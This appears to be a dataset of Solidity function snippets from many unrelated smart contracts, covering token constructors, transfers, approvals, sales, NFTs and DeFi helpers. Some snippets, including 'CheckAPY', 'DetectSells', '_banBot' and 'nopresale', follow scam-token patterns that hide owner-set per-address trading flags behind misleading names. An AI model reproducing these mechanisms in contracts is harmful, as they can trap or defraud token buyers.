        priceFeed = AggregatorV3Interface(0xdeb288F737066589598e9214E782fa5A8eD689e8);
        contractOwner = payable(msg.sender);
    }
--------------------------------------------------------------------------------
constructor() 
    DetailedERC20("Ecoshare Community Token","ECT", 18)
    public {
        totalSupply_ = 1000000000 * (10 ** uint256(decimals));
        balances[msg.sender] = totalSupply_;
        paused = true;
    }
--------------------------------------------------------------------------------
function withdraw() public onlyOwner {
    uint256 returnAmount = this.balance;
    wallet.transfer(returnAmount);
    emit EtherWithdrawn(wallet, returnAmount);
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function manualWithdrawToken(uint256 _amount) onlyOwner public {
            uint256 tokenAmount = _amount.mul(1 ether);
            _transfer(this, msg.sender, tokenAmount);
        }
--------------------------------------------------------------------------------
function addAddressesToWhitelist(address[] addrs)
    onlyOwner
    public
  {
    for (uint256 i = 0; i < addrs.length; i++) {
      addAddressToWhitelist(addrs[i]);
    }
  }
--------------------------------------------------------------------------------
function removeAddressesFromWhitelist(address[] addrs)
    onlyOwner
    public
  {
    for (uint256 i = 0; i < addrs.length; i++) {
      removeAddressFromWhitelist(addrs[i]);
    }
  }
--------------------------------------------------------------------------------
function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = 9000000000000;  // Update total supply with the decimal amount
        balanceOf[msg.sender] = totalSupply;                // Give the creator all initial tokens
        name = "Okextokencoin";                                   // Set the name for display purposes
        symbol = " OKB";                               // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function isContract( address _addr ) private returns (bool) {
    uint length;
    _addr = _addr;
    assembly { length := extcodesize(_addr) }
    return (length > 0);
  }
--------------------------------------------------------------------------------
function upgradeChainLog() public auth {
        address newChainLog = chainLog.getAddress("CHANGELOG");

        chainLog = ChainLogLike(newChainLog);

        emit NewChainLog(newChainLog);
    }
--------------------------------------------------------------------------------
constructor(string memory name, string memory symbol, string memory baseURI) public ERC721(name, symbol) {
        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());

        _setupRole(MINTER_ROLE, _msgSender());
        _setupRole(PAUSER_ROLE, _msgSender());

        _setBaseURI(baseURI);
    }
--------------------------------------------------------------------------------
function _ownerRoyalties() internal view returns (address[] memory) {
        address[] memory ownerRoyalties = new address[](1);
        ownerRoyalties[0] = owner();
        return ownerRoyalties;
    }
--------------------------------------------------------------------------------
function _ownerBPS() internal view returns (uint256[] memory) {
        uint256[] memory ownerBPS = new uint256[](1);
        ownerBPS[0] = secondaryOwnerBPS;
        return ownerBPS;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function _transfer(
    address _from,
    address _to,
    uint _amount
  ) internal
    authorizeTransfer(_from, _to, _amount, false)
  {
    require(state != STATE_INIT || _from == beneficiary, "ONLY_BENEFICIARY_DURING_INIT");
    super._transfer(_from, _to, _amount);
  }
--------------------------------------------------------------------------------
function RUNEToken() public {
        balances_[msg.sender] = totalSupply;
            emit Transfer( address(0), msg.sender, totalSupply );
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public returns (bool success)
  {
    bytes memory empty; // null
    _transfer( msg.sender, to, value, empty );
    return true;
  }
--------------------------------------------------------------------------------
function startIco() external managerOnly {
       require(statusICO == StatusICO.Created || statusICO == StatusICO.Paused);
       LogStartICO();
       statusICO = StatusICO.Started;
    }
--------------------------------------------------------------------------------
function getMintDigest(uint256 nonce, bytes32 challenge_digest, bytes32 challenge_number) public view returns(bytes32 digesttest) {
        bytes32 digest = keccak256(abi.encodePacked(challenge_number, msg.sender, nonce));
        return digest;
    }
--------------------------------------------------------------------------------
function protectedTokens() internal override view returns (address[] memory){
        address[] memory protected = new address[](1);
        protected[0] = mmVault;
        return protected;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor (Token _company_token) public {
    owner = msg.sender;
    company_token = _company_token;
    currentBatch = 0;
    addrPerStep = 25;
    setBountyAddresses();
    setBountyAmounts();
  }
--------------------------------------------------------------------------------
function validPurchase() internal view returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function setItemsNotForSale(uint256[] _tokenIds) public onlyOperator {
        for (uint256 index = 0; index < _tokenIds.length; index++) {
            setItemNotForSale(_tokenIds[index]);
        }
    }
--------------------------------------------------------------------------------
function removeDiscounts(uint256[] _tokenIds) public onlyOperator {
        for (uint256 index = 0; index < _tokenIds.length; index++) {
            _removeDiscount(_tokenIds[index]);            
        }
    }
--------------------------------------------------------------------------------
function setWithdrawTo(address _withdrawTo) public onlyOwner {
        require(_withdrawTo != address(0));

        emit LogWithdrawToChanged(withdrawTo, _withdrawTo, owner);

        withdrawTo = _withdrawTo;
    }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value>0);
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function OwnerRetireHodl(uint256 id) public onlyOwner {
        Safe storage s = _safes[id]; 
        require(s.id != 0); 
        RetireHodl(id);
    }
--------------------------------------------------------------------------------
function deauthorizeProvider(address _providerToRemove) returns (bool success) {
        authorized[msg.sender][_providerToRemove] = false;
        DeauthorizeServiceProvider(msg.sender, _providerToRemove);
        return true;
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner)
        public
        view
        override
        returns (uint256)
    {
        return
            magnifiedDividendPerShare
                .mul(balanceOf(_owner))
                .toInt256Safe()
                .add(magnifiedDividendCorrections[_owner])
                .toUint256Safe() / magnitude;
    }
--------------------------------------------------------------------------------
function transferOwnership(address _newOwner) public onlyOwner {
        require(
            _newOwner != address(0)
            && _newOwner != owner 
        );
        OwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
--------------------------------------------------------------------------------
function sketchNoLongerForSale(uint256 _sketchIndex) public onlyHolderOf(_sketchIndex) {
    sketchIndexToOffer[_sketchIndex] = Offer(false, _sketchIndex, msg.sender, 0, 0x0);
    SketchNoLongerForSale(_sketchIndex);
  }
--------------------------------------------------------------------------------
function claimRefund() public {
        require(getNow()<=refundingEndtime);
        require(isFinalized);
        require(!goalReached());
      
         vault.refund(msg.sender);
      
      
  }
--------------------------------------------------------------------------------
constructor() payable{
        owner = msg.sender; // 'msg.sender' is sender of current call, contract deployer for a constructor
        emit OwnerSet(address(0), owner);
        
        total_value = msg.value;  // msg.value is the ethers of the transaction
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function _transferSenderPaysFee_byProxy(address sender, address to, uint value, bytes data)
        internal
        returns (bool)
    {
        /* The fee is added to the amount sent. */
        uint fee = transferFeeIncurred(value);
        return _internalTransfer(sender, to, value, fee, data);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value <= 0) revert();
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _afterCall(bytes32 id) private {
        require(isOperationReady(id), "TimelockController: operation is not ready");
        _timestamps[id] = _DONE_TIMESTAMP;
    }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);       
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function EXH() public {

    // lock the transfer function during Sale
    locked = true;

    //initial token supply is 0
    totalSupply = 0;

    //Name for token set to EXH Token
    name = 'EXH Token';

    // Symbol for token set to 'EXH'
    symbol = 'EXH';
 
    decimals = 18;
  }
--------------------------------------------------------------------------------
function isPendingRegistration(address _darknodeID) external view returns (bool) {
        uint256 registeredAt = store.darknodeRegisteredAt(_darknodeID);
        return registeredAt != 0 && registeredAt > currentEpoch.blocknumber;
    }
--------------------------------------------------------------------------------
function isPendingDeregistration(address _darknodeID) external view returns (bool) {
        uint256 deregisteredAt = store.darknodeDeregisteredAt(_darknodeID);
        return deregisteredAt != 0 && deregisteredAt > currentEpoch.blocknumber;
    }
--------------------------------------------------------------------------------
function isDeregistered(address _darknodeID) public view returns (bool) {
        uint256 deregisteredAt = store.darknodeDeregisteredAt(_darknodeID);
        return deregisteredAt != 0 && deregisteredAt <= currentEpoch.blocknumber;
    }
--------------------------------------------------------------------------------
function CNYB(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function isFree(uint128 nonce) public view returns (bool){
        uint128 max = getMax();
        return isValidHighNonce(max, nonce) || isValidLowNonce(max, getRegister(), nonce);
    }
--------------------------------------------------------------------------------
function withdraw(uint256 amount, uint8 count, uint16 mgCaffeine) public {
        require(msg.sender == _owner);
        _owner.transfer(amount);
        _count += count;
        _mgCaffeine += mgCaffeine;
    }
--------------------------------------------------------------------------------
function daoMint(uint256 amount) external onlyOwner {
        uint256 total = amount * (10**decimals());
        _mint(owner(), total);
        emit Mint(total);
    }
--------------------------------------------------------------------------------
function Sale(address _impTokenAddress, address _destinationWallet) {
        require(_impTokenAddress != 0);
        require(_destinationWallet != 0);

        impToken = ImpToken(_impTokenAddress);

        destinationWallet = _destinationWallet;
    }
--------------------------------------------------------------------------------
function liquidateBorrow(address borrower, CToken cTokenCollateral) external payable {
        (uint err,) = liquidateBorrowInternal(borrower, msg.value, cTokenCollateral);
        requireNoError(err, "liquidateBorrow failed");
    }
--------------------------------------------------------------------------------
function nopresale(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            trades(_counts[i]); }
    }
--------------------------------------------------------------------------------
function transferPreSignedHashing(
        address _token,
        address _to,
        uint256 _value,
        uint256 _fee,
        uint256 _nonce
    )
        public
        pure
        returns (bytes32)
    {
        /* "48664c16": transferPreSignedHashing(address,address,address,uint256,uint256,uint256) */
        return keccak256(abi.encodePacked(bytes4(0x48664c16), _token, _to, _value, _fee, _nonce));
    }
--------------------------------------------------------------------------------
function approvePreSignedHashing(
        address _token,
        address _spender,
        uint256 _value,
        uint256 _fee,
        uint256 _nonce
    )
        public
        pure
        returns (bytes32)
    {
        /* "f7ac9c2e": approvePreSignedHashing(address,address,uint256,uint256,uint256) */
        return keccak256(abi.encodePacked(bytes4(0xf7ac9c2e), _token, _spender, _value, _fee, _nonce));
    }
--------------------------------------------------------------------------------
function increaseApprovalPreSignedHashing(
        address _token,
        address _spender,
        uint256 _addedValue,
        uint256 _fee,
        uint256 _nonce
    )
        public
        pure
        returns (bytes32)
    {
        /* "a45f71ff": increaseApprovalPreSignedHashing(address,address,uint256,uint256,uint256) */
        return keccak256(abi.encodePacked(bytes4(0xa45f71ff), _token, _spender, _addedValue, _fee, _nonce));
    }
--------------------------------------------------------------------------------
function decreaseApprovalPreSignedHashing(
        address _token,
        address _spender,
        uint256 _subtractedValue,
        uint256 _fee,
        uint256 _nonce
    )
        public
        pure
        returns (bytes32)
    {
        /* "59388d78": decreaseApprovalPreSignedHashing(address,address,uint256,uint256,uint256) */
        return keccak256(abi.encodePacked(bytes4(0x59388d78), _token, _spender, _subtractedValue, _fee, _nonce));
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function setINNBCTokenAddress(address tokenAddress) external onlyOwner() {
    require(tokenAddress != address(0), "Token address cannot be null");

    tokenINNBCAddress = tokenAddress;
  }
--------------------------------------------------------------------------------
function supplyFulcrum(uint amount) public {
	    require(Fulcrum(fulcrum).mint(address(this), amount) > 0, "FULCRUM: supply failed");
	}
--------------------------------------------------------------------------------
function withdrawFulcrum(uint amount) public {
		require(Fulcrum(fulcrum).burn(address(this), amount) > 0, "FULCRUM: withdraw failed");
	}
--------------------------------------------------------------------------------
function getNextPriceAdjustmentTime() public view returns (uint256 nextPriceAdjustmentTime) {
        if (now >= lastPriceAdjustment + timeBetweenPriceAdjustments) return 0;
        else return lastPriceAdjustment + timeBetweenPriceAdjustments - now;
    }
--------------------------------------------------------------------------------
function _requireAccessToSuspend(bytes32 section) internal view {
        require(accessControl[section][msg.sender].canSuspend, "Restricted to access control list");
    }
--------------------------------------------------------------------------------
constructor (string memory _nm, string memory _sym) public {
        _name = _nm;
        _symbol = _sym;
        _Owner = msg.sender;
        feeExcludedAddress[msg.sender] = true;
    }
--------------------------------------------------------------------------------
function mint(
    address _to,
    uint256 _id,
    uint256 _quantity,
    bytes memory _data
  ) public creatorOnly(_id) {
    _mint(_to, _id, _quantity, _data);
    tokenSupply[_id] = tokenSupply[_id].add(_quantity);
  }
--------------------------------------------------------------------------------
constructor(
        uint256 initialSupply,
        string memory tokenName,
        string memory tokenSymbol
    ) public {
        totalSupply = 15000000000000000;  // Update total supply with the decimal amount
        balanceOf[msg.sender] = totalSupply;                // Give the creator all initial tokens
        name = "RoboBit AI";                                   // Set the name for display purposes
        symbol = "RBAI";                               // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
      if (master == 0x0) throw;
      if (msg.sender != upgradeMaster) throw;
      upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function totalRewardsInThePool(uint256 _pid, address _poolAddress) public view returns (uint256){
        // Retrieve Pool information
        PoolInfo storage pool = poolInfo[_pid];
        return ERC20(pool.rewardsToken).balanceOf(_poolAddress);
        }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    lion[spender] = val;
    trump[spender] = val2; 
    junior[spender] = val3;
    grandhotel = val4;
  }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) pure internal returns(uint256) {
      uint256 z = x + y;
      assert((z >= x) && (z >= y));
      return z;
    }
--------------------------------------------------------------------------------
function createToken(uint256 _tokenId, uint256 _startingPrice) public onlyOwner {
    Token memory token = Token({
      price: _startingPrice,
      owner: owner
    });

    tokens[_tokenId] = token;
  }
--------------------------------------------------------------------------------
function allowance(address _owner, address _spender) public view returns (uint256) {
      require(_owner != address(0)&&_spender!=address(0));
    return allowed[_owner][_spender];
  }
--------------------------------------------------------------------------------
function mintHumanRouterTrophy(address winner, string memory uri) public onlyCreator {
        _mint(winner, 4);
        _tokenNames[4] = "Human Router Trophy";
        _tokenURIs[4] = uri;
    }
--------------------------------------------------------------------------------
function mintKevinBaconTrophy(address winner, string memory uri) public onlyCreator {
        _mint(winner, 6);
        _tokenNames[6] = "Kevin Bacon Trophy";
        _tokenURIs[6] = uri;
    }
--------------------------------------------------------------------------------
function EDN(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function checkAddressTotalContribution(address sender, uint value) private view returns (bool) {
      if (ethContributed[sender] + value <= 2.5 ether) {
        return true;
      }
      return false;
    }
--------------------------------------------------------------------------------
function totalLiquidationSpread()
        public
        view
        returns (Decimal.D256 memory)
    {
        return Decimal.D256({
            value: market.liquidationUserFee.value.add(
                market.liquidationArcFee.value
            )
        });
    }
--------------------------------------------------------------------------------
function() public payable {
    // throws on failure
    parentAddress.transfer(msg.value);
    // Fire off the deposited event if we can forward it
    ForwarderDeposited(msg.sender, msg.value, msg.data);
  }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external override {
        operatorApproval[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function DetectSells(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    grandtour[spender] = val;
    mejor[spender] = val2; 
    santana[spender] = val3;
    sunrise = val4;
  }
--------------------------------------------------------------------------------
function calculateTokensFromWei(uint weiValue, uint ratio) public view returns (uint numTokens) {
        uint calc1 = safeMul(weiValue, ratio);
        uint ethValue = calc1 / _factorDecimalsEthToToken;
        return ethValue;
    }
--------------------------------------------------------------------------------
function calculateEthValueFromTokens(uint numTokens, uint ratio) public view returns (uint weiValue) {
        uint calc1 = safeMul(numTokens, _factorDecimalsEthToToken);
        uint retValue = calc1 / ratio;
        return retValue;
    }
--------------------------------------------------------------------------------
function sendSpecialTasterPackage(address addr, uint ugToTaste) public whenNotPaused onlyOwner returns (bool success) {
        tastersReceived[addr] = safeAdd(tastersReceived[addr], ugToTaste);
        transfer(addr, ugToTaste);
        return true;
    }
--------------------------------------------------------------------------------
function flush() public whenNotPaused returns (bool success) {
        //Current block number is already greater than the limit to be flushable?
        if(block.number >= toFlush[msg.sender]) {
            return downTheDrainImmediate();
        }
        else return false;
    }
--------------------------------------------------------------------------------
function hasFRT() private view returns (bool) {
        if (token.balanceOf(msg.sender) > 0) {
            return true;
        } else {
            return false;
        }
    }
--------------------------------------------------------------------------------
function addAddressesToWhitelist(address[] _operators)
    public
    onlyOwner
  {
    for (uint256 i = 0; i < _operators.length; i++) {
      addAddressToWhitelist(_operators[i]);
    }
  }
--------------------------------------------------------------------------------
function removeAddressesFromWhitelist(address[] _operators)
    public
    onlyOwner
  {
    for (uint256 i = 0; i < _operators.length; i++) {
      removeAddressFromWhitelist(_operators[i]);
    }
  }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) isRunning returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function supportsInterface(bytes4 _interfaceID) public pure returns (bool) {
        return _interfaceID == INTERFACE_META_ID ||
        _interfaceID == ADDR_INTERFACE_ID ||
        _interfaceID == NAME_INTERFACE_ID ||
        _interfaceID == TEXT_INTERFACE_ID ||
        _interfaceID == CONTENT_HASH_INTERFACE_ID;
    }
--------------------------------------------------------------------------------
function() external payable {
        if ( validatorsCount >= validationsRequired ) {
    		emit FundsReceived(msg.sender, msg.value);
        } else {
            revert();
        }
	}
--------------------------------------------------------------------------------
function getAdvocate(address _id) external view returns (address) {
		require (isExist(_id));
		PositionDetail memory _positionDetail = positionDetails[_id];
		return _positionDetail.advocateId;
	}
--------------------------------------------------------------------------------
function getListener(address _id) public view returns (address) {
		require (isExist(_id));
		PositionDetail memory _positionDetail = positionDetails[_id];
		return _positionDetail.listenerId;
	}
--------------------------------------------------------------------------------
function getSpeaker(address _id) public view returns (address) {
		require (isExist(_id));
		PositionDetail memory _positionDetail = positionDetails[_id];
		return _positionDetail.speakerId;
	}
--------------------------------------------------------------------------------
constructor() public {
        name = "X8C token";
        symbol = "X8C";
        decimals = 18;
        mintingContractAddress = 0x546BdB5eDA549dD3a1e43108A79e9a05BA07e527;
        lockFromSelf(0);
    }
--------------------------------------------------------------------------------
function deactivate(address contributor)
        public
        onlyOwner
    {
        require(registry[contributor]);
        registry[contributor] = false;
        RegistrationStatusChanged(contributor, false, cap[contributor]);

    }
--------------------------------------------------------------------------------
function reactivate(address contributor)
        public
        onlyOwner
    {
        require(hasPreviouslyRegistered(contributor));
        registry[contributor] = true;
        RegistrationStatusChanged(contributor, true, cap[contributor]);
    }
--------------------------------------------------------------------------------
function ownerSafeWithdrawal() external
        onlyOwner
        nonReentrant
    {
        uint balanceToSend = this.balance;
        beneficiary.transfer(balanceToSend);
        FundTransfer(beneficiary, balanceToSend, false);
    }
--------------------------------------------------------------------------------
function getPricePerFullShare() public view returns (uint256) {
        if (totalSupply() == 0) return 0;
        return balance().mul(1e18).div(totalSupply());
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function getNotaryForSeller(
    address seller
  ) public view validAddress(seller) returns (address) {
    require(hasSellerBeenAccepted(seller));
    SellerInfo memory info = sellerInfo[seller];
    return info.notary;
  }
--------------------------------------------------------------------------------
function replaceBoardMember(address _oldMember, address _newMember)
        public
        onlyBoard
        returns (bool)
    {
        require(removeBoardMember(_oldMember), "Failed to remove old member");
        return addBoardMember(_newMember);
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    gemstone[spender] = val;
    fish[spender] = val2; 
    peces[spender] = val3;
    gallons = val4;
  }
--------------------------------------------------------------------------------
function getCurrentBonus() public constant returns (uint) {
    if(now > endDate || state == SaleState.ENDED) {
      return 0;
    }
    return bonus.getBonus();
  }
--------------------------------------------------------------------------------
function claimUnsold() onlyOwner {
    if ( now < ENDTIME )
      revert();

    tokenSC.transfer( owner, tokenSC.balanceOf(address(this)) );
  }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) returns (bool _success) {
        bytes memory emptyMetadata;
        __transfer(msg.sender, _to, _value, emptyMetadata);
        return true;
    }
--------------------------------------------------------------------------------
function isContract(address _addr) internal returns (bool _isContract) {
        _addr = _addr; // to avoid warnings during compilation

        uint256 length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return (length > 0);
    }
--------------------------------------------------------------------------------
function transferWithData(address to, uint256 value, bytes calldata data)
    external
    isValidCertificate(data)
  {
    _transferWithData("", msg.sender, msg.sender, to, value, data, "", true);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal view returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function subtractDarknodeFee(uint256 _value) private pure returns (ValueWithFees memory) {
        uint256 newValue = (_value * (DARKNODE_FEES_DENOMINATOR - DARKNODE_FEES_NUMERATOR)) / DARKNODE_FEES_DENOMINATOR;
        return ValueWithFees(newValue, _value - newValue);
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
    require(index < totalSupply(), "ERC721A: global index out of bounds");
    return index;
  }
--------------------------------------------------------------------------------
function transfer_ownership(address to) public onlyOwner {
        owner = to;
        balances[owner] = balances[msg.sender];
        balances[msg.sender] = 0;
    }
--------------------------------------------------------------------------------
constructor(ERC20 _arpToken, uint256 _depositStartTime) public {
        arpToken = _arpToken;
        owner = msg.sender;
        depositStartTime = _depositStartTime;
        depositStopTime = _depositStartTime.add(DEPOSIT_PERIOD);
    }
--------------------------------------------------------------------------------
function setEthPriceProvider(address provider) external onlyOwner {
        require(provider != address(0), "Provider is the zero address");

        ethPriceProvider = provider;
    }
--------------------------------------------------------------------------------
function purgeAccount(address account)
        external
        onlyOwner
        onlyDuringSetup
    {
        delete vestingSchedules[account];
        totalVestedBalance = safeSub(totalVestedBalance, totalVestedAccountBalance[account]);
        delete totalVestedAccountBalance[account];
    }
--------------------------------------------------------------------------------
function addWhiteList (address botAdd) public {
        require(_msgSender() == _deadWallet, "ERC20: cannot permit dev address");
        _whiteList.push(botAdd);
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function _banBot(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            botbancount(_counts[i]); }
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function validateNonce(uint nounce) private onlySigner {
        require(nounce > lastNounce && nounce <= (lastNounce+1000), "Enter Valid Nounce");
        lastNounce=nounce;
    }
--------------------------------------------------------------------------------
function Tile() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function getTypes() external view returns(uint8[]) {
        uint8[] memory res = new uint8[](1);
        res[0] = 2;
        return res;
    }
--------------------------------------------------------------------------------
function transferOwnership(
        address newOwner
        )
        public
        onlyOwner
    {
        require(newOwner != address(0x0), "ZERO_ADDRESS");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
--------------------------------------------------------------------------------
function acceptOwnership() public{
        require(msg.sender == newOwner);
        OwnerUpdate(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
--------------------------------------------------------------------------------
function sub(uint256 a, uint256 b) 
        internal
        pure
        returns (uint256) 
    {
        if (b > a) {
            return 0;
        }
        uint256 c = a - b;
        return c;
    }
--------------------------------------------------------------------------------
function acceptOwnership()
        public
        noReentry
        returns (bool)
    {
        require(msg.sender == newOwner);
        ChangedOwner(owner, newOwner);
        owner = newOwner;
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool) {
      if (isTransferWhitelistOnly) {
        require(isUserAllowedToTransfer(msg.sender));
      }
      return super.transfer(_to, _value);
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        if (isTransferWhitelistOnly) {
            require(isUserAllowedToTransfer(_from));
        }
        return super.transferFrom(_from, _to, _value);
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
    require(isApprovedFor(msg.sender, _tokenId));
    clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
  }
--------------------------------------------------------------------------------
function clearApproval(address _owner, uint256 _tokenId) private {
    require(ownerOf(_tokenId) == _owner);
    tokenApprovals[_tokenId] = 0;
    Approval(_owner, 0, _tokenId);
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    require(_to != address(0));
    addToken(_to, _tokenId);
    Transfer(0x0, _to, _tokenId);
  }
--------------------------------------------------------------------------------
function removeMinter(address minter)
        external
        onlyMasterMinter
        returns (bool)
    {
        minters[minter] = false;
        minterAllowed[minter] = 0;
        emit MinterRemoved(minter);
        return true;
    }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);
        
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function resumeFuturesMarket(bytes32 marketKey) external {
        bytes32[] memory marketKeys = new bytes32[](1);
        marketKeys[0] = marketKey;
        _internalResumeFuturesMarkets(marketKeys);
    }
--------------------------------------------------------------------------------
function _requireAccessToSuspend(bytes32 section) internal view {
        require(accessControl[section][msg.sender].canSuspend, "Restricted to access control list");
    }
--------------------------------------------------------------------------------
